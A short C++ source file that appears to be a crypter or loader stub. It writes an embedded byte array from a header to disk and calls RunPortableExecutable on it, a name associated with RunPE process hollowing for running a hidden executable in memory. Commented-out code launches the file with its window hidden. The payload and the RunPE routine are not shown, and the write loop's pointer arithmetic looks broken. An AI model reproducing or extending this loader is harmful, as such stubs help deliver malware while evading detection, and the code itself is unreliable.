#include <iostream>
#include <atlstr.h>
#include <fstream>
#include <assert.h>
#include <stdlib.h>
#include <stdio.h>
#include <shlobj.h>
#include <Windows.h>
#include <Shlwapi.h>
#include <TlHelp32.h>
#include "Data.h"
#include "Protection.h"

VOID DECODE()
{
	std::ofstream file;
	//CoInitialize(0);
	file.open(L"C:/Users/artro/source/repos/CPPEXE/CPPEXE/tempo", std::ios_base::binary);
	assert(file.is_open());
	for (int i = 0; i < sizeof(data) / sizeof(data[0]); ++i)
		file.write((char*)(data + i * sizeof(data[0])), sizeof(data[0]));
	file.close();
	
}

VOID RUN()
{
	
	RunPortableExecutable(data);
	
	//STARTUPINFO si;

	//PROCESS_INFORMATION pi;
	//ZeroMemory(&si, sizeof(si));
	//si.cb = sizeof(si);
	//ZeroMemory(&pi, sizeof(pi));
	//if (!CreateProcess(L"C:/Users/artro/source/repos/CPPEXE/CPPEXE/tempo", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)){}
	//ShowWindow((HWND)pi.hThread,0);
	//
	//WaitForSingleObject(pi.hProcess, INFINITE);
	////if (!pi.hProcess) {
	////	remove("C:/Windows/Temp/tempo");
	////}
	//CloseHandle(pi.hProcess);
	//CloseHandle(pi.hThread);
}
